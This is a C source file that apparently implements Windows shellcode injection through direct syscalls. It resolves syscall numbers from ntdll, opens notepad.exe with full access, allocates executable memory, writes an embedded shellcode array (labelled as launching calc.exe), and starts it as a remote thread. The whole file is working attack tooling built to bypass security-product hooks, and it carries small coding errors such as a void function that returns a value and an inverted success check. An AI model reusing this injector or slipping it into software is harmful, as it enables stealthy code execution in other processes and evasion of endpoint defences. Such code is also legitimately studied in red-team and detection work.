#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include "handBag.h"
#include <psapi.h>
#include <wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")



DWORD NtOpenProcessSSN;
DWORD NtAllocateVirtualMemorySSN;
DWORD NtProtectVirtualMemorySSN;
DWORD NtProtectVirtualMemorySSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtCloseSSN;

DWORD GetSSN(IN HMODULE hNTDLL, IN LPCSTR NtFunction) {
    DWORD NtFunctionSSN = NULL;
    UINT_PTR NtFunctionAddress = NULL;

    info("Obtaining the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("Error obtaining address of %s", NtFunction);
        return NULL;
    }
    okay("Address of %s obtained!", NtFunction);
    info("getting SSN of %s...", NtFunction);
    NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    info("\\_____\n          ||  %s\n          || -> Address:  %p\n          || -> Offset:   +0x4\n          || -> SSN:      0x%lx\n          ||_______________________________\n\n", NtFunction, NtFunctionAddress, NtFunctionSSN);

    return NtFunctionSSN;
}


HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;

    hModule = GetModuleHandleW(modName);
    if (hModule == NULL) {
    }
    else {
        okay("got a handle to the module!");
        info("\\___\n       ||%S\n\       ||0x%p\n", modName, hModule);
        return hModule;
    }
}


int FindTarget(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count))
        return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }
    return pid;
}


void Janitor(IN HANDLE hProcThread) {
    info("Time to get clean!...");
    if (hProcThread) {
        NTSTATUS STATUS = NtClose(hProcThread);
        if (STATUS != 0) {
            warn("NtClose Failed to Close handle, error: 0x1%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("Handle closed!");
    }
}
BOOL DirectSyscallsInjector(const PBYTE payload, SIZE_T payload_len) {
    DWORD dwPID = NULL;
    NTSTATUS STATUS;
    HANDLE hProc = NULL;
    HMODULE hNTDLL = NULL;
    HANDLE hThread = NULL;
    PVOID rBuffer = NULL;
    SIZE_T allocSize = 4096;  // Allocate one page of memory (4096 bytes)
    SIZE_T bytesWritten = 0;
    DWORD OldProtection = 0;
    BOOL STATE = TRUE;

    warn("Direct Syscalls\n");

    hNTDLL = getMod(L"NTDLL");
    NtOpenProcessSSN = GetSSN(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemorySSN = GetSSN(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemorySSN = GetSSN(hNTDLL, "NtWriteVirtualMemory");
    NtProtectVirtualMemorySSN = GetSSN(hNTDLL, "NtProtectVirtualMemory");
    NtCreateThreadExSSN = GetSSN(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObjectSSN = GetSSN(hNTDLL, "NtWaitForSingleObject");
    NtCloseSSN = GetSSN(hNTDLL, "NtClose");

    warn("Syscalls Obtained, beginning injection!\n");

    dwPID = FindTarget("notepad.exe");

    info("The PID of notepad is: %lld", dwPID);

    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
    CLIENT_ID CID = { (HANDLE)dwPID, 0 };

    // Open process
    STATUS = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtOpenProcess failed, error 0x%1x\n", STATUS);
        STATE = FALSE;
        return EXIT_FAILURE;
    }

    // Allocate one page of memory in the target process
    STATUS = NtAllocateVirtualMemory(hProc, &rBuffer, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtAllocateVirtualMemory failed, error 0x%1x\n", STATUS);
        Janitor(hProc);
        STATE = FALSE;
        return EXIT_FAILURE;
    }

    // Write shellcode (only 276 bytes) into allocated memory
    STATUS = NtWriteVirtualMemory(hProc, rBuffer, payload, payload_len, &bytesWritten);
    if (STATUS_SUCCESS != STATUS) {
        warn("NtWriteVirtualMemory failed, error 0x%1x\n", STATUS);
        Janitor(hProc);
        STATE = FALSE;
        return EXIT_FAILURE;
    }
    okay("[0x%p] [RW-] wrote %zu-bytes to buffer", rBuffer, bytesWritten);

    // Create remote thread in target process to execute shellcode
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtCreateThreadEx failed, error 0x%1x\n", STATUS);
        Janitor(hProc);
        STATE = FALSE;
        return EXIT_FAILURE;
    }

    info("Thread created, waiting for execution");

    // Wait for thread to complete
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtWaitForSingleObject failed, error 0x%1x\n", STATUS);
        STATE = FALSE;
        return EXIT_FAILURE;
    }

    info("Execution complete, cleaning up");

    // Cleanup
    Janitor(hThread);
    Janitor(hProc);
    return STATE;
}

int main(int argc, char* argv[]) {


    const UCHAR payload[] = {
        // shellcode to open calc
     0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
    0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
    0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
    0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
    0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
    0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
    0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
    0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00 };

//    info("The size of the payload is %d", sizeof(payload));
    if (!DirectSyscallsInjector(payload, sizeof(payload)) == 0) {
        warn("Direct Syscalls injection failed");
        return EXIT_FAILURE;
    };
    
    return 0;
}


